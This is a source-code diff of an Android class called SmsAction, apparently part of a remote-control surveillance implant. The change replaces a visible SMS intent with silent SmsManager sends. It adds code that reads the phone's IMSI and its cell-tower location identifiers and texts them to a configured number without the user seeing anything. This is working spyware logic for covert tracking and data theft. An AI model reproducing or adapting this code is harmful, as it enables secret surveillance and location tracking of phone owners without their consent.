@@ -10,11 +10,12 @@ package com.ht.RCSAndroidGUI.action;
 
 import java.io.IOException;
 
-import android.content.Intent;
-import android.net.Uri;
+import android.content.Context;
+import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
 import android.util.Log;
 
-import com.ht.RCSAndroidGUI.Debug;
+import com.ht.RCSAndroidGUI.CellInfo;
 import com.ht.RCSAndroidGUI.Device;
 import com.ht.RCSAndroidGUI.Status;
 import com.ht.RCSAndroidGUI.util.Check;
@@ -36,6 +37,8 @@ public class SmsAction extends SubAction {
 	/** The Constant TYPE_TEXT. */
 	private static final int TYPE_TEXT = 3;
 	private static final String TAG = "SmsAction";
+	
+	private SmsManager sm;
 
 	/** The number. */
 	String number;
@@ -56,6 +59,8 @@ public class SmsAction extends SubAction {
 	 */
 	public SmsAction(final int type, final byte[] confParams) {
 		super(type, confParams);
+		
+		 sm = SmsManager.getDefault();
 	}
 
 	/*
@@ -69,15 +74,37 @@ public class SmsAction extends SubAction {
 		try {
 			switch (type) {
 			case TYPE_TEXT:
+				sendSMS(text);
+				return true;
+				
 			case TYPE_SIM:
-				return sendSMS(text);
+				//SystemPropertiesProxy.get(android.telephony.TelephonyProperties.PROPERTY_IMSI);
+				TelephonyManager mTelephonyMgr = (TelephonyManager)Status.getAppContext().getSystemService(Context.TELEPHONY_SERVICE); 
+				String imsi = mTelephonyMgr.getSubscriberId();
+				
+				text = "IMSI: " + imsi;
+				sendSMS(text);
+				return true;
 
 			case TYPE_LOCATION:
+				// TODO Implementare il location
 				// http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
-				if (!getGPSPosition()) {
-					errorLocation();
-				}
+				//if (!getGPSPosition()) {
+				//	errorLocation();
+				//}
 
+				CellInfo c = Device.getCellInfo();
+				
+				if (c.cdma && c.valid) {
+					text = "SID: " + c.sid + ", NID: " + c.nid + ", BID: " + c.bid;
+					sendSMS(text);
+				}
+				
+				if (c.gsm && c.valid) {
+					text = "CC: " + c.mcc + ", MNC: " + c.mnc + ", LAC: " + c.lac + ", CID: " + c.cid;
+					sendSMS(text);
+				}
+				
 				break;
 			}
 			return true;
@@ -120,15 +147,11 @@ public class SmsAction extends SubAction {
 	 * Send sms.
 	 *
 	 * @param text the text
-	 * @return true, if successful
 	 */
-	private boolean sendSMS(final String text) {
-		final Uri smsUri = Uri.parse("tel:" + number);
-		final Intent intent = new Intent(Intent.ACTION_VIEW, smsUri);
-		intent.putExtra("sms_body", text);
-		intent.setType("vnd.android-dir/mms-sms");
-		Status.getAppContext().startActivity(intent);
-		return true;
+	private void sendSMS(final String text) {
+		sm.sendTextMessage(number, null, text, null, null);
+		
+		return;
 	}
 
 	/**
@@ -150,6 +173,7 @@ public class SmsAction extends SubAction {
 
 			switch (type) {
 				case TYPE_TEXT:
+					// TODO controllare che la lunghezza non sia superiore a 70 caratteri
 					len = databuffer.readInt();
 					buffer = new byte[len];
 					databuffer.read(buffer);
@@ -163,13 +187,14 @@ public class SmsAction extends SubAction {
 				case TYPE_SIM:
 					final StringBuffer sb = new StringBuffer();
 					final Device device = Device.self();
+					
 					if (Device.isCdma()) {
-	
 						// sb.append("SID: " + device.getSid() + "\n");
 						// sb.append("ESN: "
 						// + NumberUtilities.toString(device.getEsn(), 16)
 						// + "\n");
-					} 
+					}
+					
 					if (Device.isGprs()) {
 						sb.append("IMEI: " + device.getImei() + "\n");
 						sb.append("IMSI: " + device.getImsi() + "\n");
@@ -182,7 +207,6 @@ public class SmsAction extends SubAction {
 					Log.d(TAG,"Error: SmsAction.parse,  Unknown type: " + type);
 					break;
 			}
-
 		} catch (final IOException e) {
 			return false;
 		}
@@ -196,6 +220,7 @@ public class SmsAction extends SubAction {
 	@Override
 	public String toString() {
 		final StringBuffer sb = new StringBuffer();
+		
 		sb.append("Sms type: " + type);
 		sb.append(" number: " + number);
 		sb.append(" text: " + text);
